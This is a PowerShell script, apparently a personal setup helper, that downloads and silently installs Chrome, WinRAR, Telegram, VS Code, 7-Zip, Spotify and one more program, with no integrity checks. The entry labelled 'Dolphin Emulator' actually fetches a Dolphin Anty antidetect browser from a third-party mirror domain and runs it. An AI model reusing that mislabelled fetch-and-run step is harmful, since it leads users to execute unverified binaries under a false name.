# Папка для інсталяторів
$downloadDir = "C:\Installers"
if (!(Test-Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir | Out-Null
}

function Test-Installed($appName, $installPath, $regKey) {
    # Перевірка по папці
    if ($installPath -and (Test-Path $installPath)) {
        return $true
    }
    # Перевірка по реєстру
    if ($regKey) {
        $reg = Get-ItemProperty -Path $regKey -ErrorAction SilentlyContinue
        if ($reg) { return $true }
    }
    return $false
}

$apps = @(
    @{
        name = "Chrome"
        url = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
        args = "/silent /install"
        installPath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
        regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome"
    },
    @{
        name = "WinRAR"
        url = "https://www.rarlab.com/rar/winrar-x64-713uk.exe"
        args = "/S"
        installPath = "C:\Program Files\WinRAR\WinRAR.exe"
        regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinRAR archiver"
    },
    @{
        name = "Telegram"
        url = "https://telegram.org/dl/desktop/win"
        args = ""
        installPath = "C:\Users\$env:USERNAME\AppData\Roaming\Telegram Desktop\Telegram.exe"
        regKey = ""
    },
    @{
        name = "Dolphin Emulator"
        url = "https://app.dolphin-anty-mirror3.net/anty-app/dolphin-anty-win-latest.exe"
        args = "/S"
        installPath = "C:\Program Files\Dolphin\Dolphin.exe"
        regKey = ""
    },
    @{
        name = "Visual Studio Code"
        url = "https://update.code.visualstudio.com/latest/win32-x64-user/stable"
        args = "/silent"
        installPath = "C:\Users\$env:USERNAME\AppData\Local\Programs\Microsoft VS Code\Code.exe"
        regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Visual Studio Code"
    },
    @{
        name = "7-Zip"
        url = "https://www.7-zip.org/a/7z2400-x64.exe"
        args = "/S"
        installPath = "C:\Program Files\7-Zip\7z.exe"
        regKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\7-Zip"
    },
    @{
        name = "Spotify"
        url = "https://download.scdn.co/SpotifySetup.exe"
        args = "/silent"
        installPath = "C:\Users\$env:USERNAME\AppData\Roaming\Spotify\Spotify.exe"
        regKey = ""
    }
)

foreach ($app in $apps) {
    $path = "$downloadDir\$($app.name).exe"

    if (Test-Installed $app.name $app.installPath $app.regKey) {
        Write-Host "`nSkipping $($app.name), already installed."
        continue
    }

    if (Test-Path $path) {
        Write-Host "`nSkipping download for $($app.name), file already exists."
    }
    else {
        Write-Host "`nDownloading $($app.name)..."
        try {
            Invoke-WebRequest $app.url -OutFile $path -UseBasicParsing
            Write-Host "Downloaded $($app.name)."
        }
        catch {
            Write-Host "ERROR downloading $($app.name): $_"
            continue
        }
    }

    Write-Host "Installing $($app.name)..."
    try {
        if ($app.args -ne "") {
            Start-Process $path -ArgumentList $app.args -Wait
        }
        else {
            Start-Process $path -Wait
        }
    }
    catch {
        Write-Host "ERROR installing $($app.name): $_"
    }
}

Write-Host "`nAll tasks finished by merybist"
